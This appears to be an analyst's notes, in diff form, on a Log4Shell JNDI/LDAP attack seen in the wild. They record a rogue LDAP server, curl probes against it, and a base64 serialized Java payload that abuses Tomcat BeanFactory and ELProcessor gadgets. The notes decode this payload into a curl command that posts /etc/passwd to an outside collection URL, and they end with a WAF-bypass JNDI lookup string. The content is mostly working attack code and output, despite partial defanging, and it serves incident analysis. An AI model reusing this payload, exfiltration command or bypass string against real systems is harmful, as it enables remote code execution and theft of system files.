@@ -1,0 +1,21 @@
+ROGUE LDAP 45.66.8.12
+
+No behavior when curl ldap:/45(.)66.8.12:1328/o=tomcat is done.
+
+But when curl ldap:/45(.)66.8.12:1328/o=tomcat&host=<fake_site>.com&path=&file=&param=requestpath&info=windows is done, deserialized data is thrown.
+
+root@ubuntu:/# DN: o=tomcat
+	javaClassName: java.lang.String
+
+	javaSerializedData:: rO0ABXNyAB1vcmcuYXBhY2hlLm5hbWluZy5SZXNvdXJjZVJlZgAAAAAAAAABAgAAeHIAHW9yZy5hcGFjaGUubmFtaW5nLkFic3RyYWN0UmVmAAAAAAAAAAECAAB4cgAWamF2YXgubmFtaW5nLlJlZmVyZW5jZejGnqKo6Y0JAgAETAAFYWRkcnN0ABJMamF2YS91dGlsL1ZlY3RvcjtMAAxjbGFzc0ZhY3Rvcnl0ABJMamF2YS9sYW5nL1N0cmluZztMABRjbGFzc0ZhY3RvcnlMb2NhdGlvbnEAfgAETAAJY2xhc3NOYW1lcQB+AAR4cHNyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAV1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAGmphdmF4Lm5hbWluZy5TdHJpbmdSZWZBZGRyhEv0POER3MkCAAFMAAhjb250ZW50c3EAfgAEeHIAFGphdmF4Lm5hbWluZy5SZWZBZGRy66AHmgI4r0oCAAFMAAhhZGRyVHlwZXEAfgAEeHB0AAVzY29wZXQAAHNxAH4AC3QABGF1dGhxAH4AD3NxAH4AC3QACXNpbmdsZXRvbnQABHRydWVzcQB+AAt0AAtmb3JjZVN0cmluZ3QABng9ZXZhbHNxAH4AC3QAAXh0Af17IiIuZ2V0Q2xhc3MoKS5mb3JOYW1lKCJqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlciIpLm5ld0luc3RhbmNlKCkuZ2V0RW5naW5lQnlOYW1lKCJKYXZhU2NyaXB0IikuZXZhbCgiamF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoU3RyaW5nLmZyb21DaGFyQ29kZSg5OSwxMTcsMTE0LDEwOCwzMiw0NSwxMDUsMzIsNDUsODgsMzIsODAsNzksODMsODQsMzIsMTA0LDExNiwxMTYsMTEyLDExNSw1OCw0Nyw0NywxMDEsMTEwLDEwNCwxMTgsOTksMTE3LDQ5LDUwLDEyMSw0OCw1NywxMDgsMTE2LDU1LDEyMSw0NiwxMDksNDYsMTEyLDEwNSwxMTIsMTAxLDEwMCwxMTQsMTAxLDk3LDEwOSw0NiwxMTAsMTAxLDExNiw2MywxMDQsMTExLDExNSwxMTYsNjEsMTExLDYxLDExNiwxMTEsMTA5LDk5LDk3LDExNiwzMiw0NSw0NSwxMDAsOTcsMTE2LDk3LDQ1LDk4LDEwNSwxMTAsOTcsMTE0LDEyMSwzMiw2NCw0NywxMDEsMTE2LDk5LDQ3LDExMiw5NywxMTUsMTE1LDExOSwxMDApKSIpfXBwcHBweHQAJW9yZy5hcGFjaGUubmFtaW5nLmZhY3RvcnkuQmVhbkZhY3RvcnlwdAAUamF2YXguZWwuRUxQcm9jZXNzb3I=
+
+Base64 decode is this
+
+srorg.apache.naming.ResourceRefxrorg.apache.naming.AbstractRefxrjavax.naming.Referenceƞ	LaddrstLjava/util/Vector;LclassFactorytLjava/lang/String;LclassFactoryLocationq~L	classNameq~xpsrjava.util.Vectorٗ}[;IcapacityIncrementIelementCount[elementDatat[Ljava/lang/Object;xpur[Ljava.lang.Object;Xs)lxp
+srjavax.naming.StringRefAddrK<Lcontentsq~xrjavax.naming.RefAddr8JLaddrTypeq~xptscopetsq~tauthq~sq~t	singletonttruesq~tforceStringtx=evalsq~txt{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec(String.fromCharCode(99,117,114,108,32,45,105,32,45,88,32,80,79,83,84,32,104,116,116,112,115,58,47,47,101,110,104,118,99,117,49,50,121,48,57,108,116,55,121,46,109,46,112,105,112,101,100,114,101,97,109,46,110,101,116,63,104,111,115,116,61,111,61,116,111,109,99,97,116,32,45,45,100,97,116,97,45,98,105,110,97,114,121,32,64,47,101,116,99,47,112,97,115,115,119,100))")}pppppxt%org.apache.naming.factory.BeanFactoryptjavax.el.ELProcessor
+
+Convert char bytes to string
+
+curl -i -X POST https://enhvcu12y09lt7y(.m.pipedream.net?host=o=tomcat --data-binary @/etc/passwd
+
+WAF Bypass {${:::::::::::::::::-j}ndi:ldap:/45(.66.8.12:1328/o=tomcat&
